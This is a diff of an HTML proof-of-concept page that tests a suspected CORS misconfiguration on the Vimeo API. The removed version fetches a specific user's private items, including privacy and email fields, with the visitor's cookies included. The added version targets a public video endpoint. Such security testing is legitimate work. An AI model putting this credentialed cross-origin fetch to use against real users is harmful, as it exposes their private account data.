@@ -1,28 +1,23 @@
 <!DOCTYPE html>
 <html>
-  <head>
-    <title>Vimeo CORS PoC</title>
-  </head>
+  <head><title>Vimeo CORS Misconfig PoC</title></head>
   <body>
-    <h1>Testing CORS Misconfiguration on Vimeo API</h1>
-    <pre id="output">Waiting...</pre>
-
+    <h1>Vimeo CORS Misconfiguration Test</h1>
+    <pre id="output">Loading...</pre>
     <script>
-      async function testVimeo() {
+      async function test() {
         try {
-          const response = await fetch("https://api.vimeo.com/users/244943635/items?per_page=4&fields=type,video.id,video.name,video.uri,video.last_user_action_event_date,video.link,video.review_page.link,video.pictures,video.metadata.interactions.edit,video.manage_link,video.privacy.view,meta,folder.name,folder.uri,folder.last_user_action_event_date,folder.metadata.connections.items.uri,folder.metadata.connections.items.total,email&sort=last_user_action_event_date", {
-            credentials: "include" // send cookies/JWT automatically
+          // public endpoint (safe demo)
+          const res = await fetch("https://api.vimeo.com/videos/76979871", {
+            credentials: "include"
           });
-
-          const text = await response.text();
-          document.getElementById("output").innerText = text;
-          console.log("Response from Vimeo API:", text);
-        } catch (err) {
-          document.getElementById("output").innerText = "Error: " + err;
+          const data = await res.json();
+          document.getElementById("output").innerText = JSON.stringify(data, null, 2);
+        } catch (e) {
+          document.getElementById("output").innerText = "Error: " + e;
         }
       }
-
-      testVimeo();
+      test();
     </script>
   </body>
 </html>
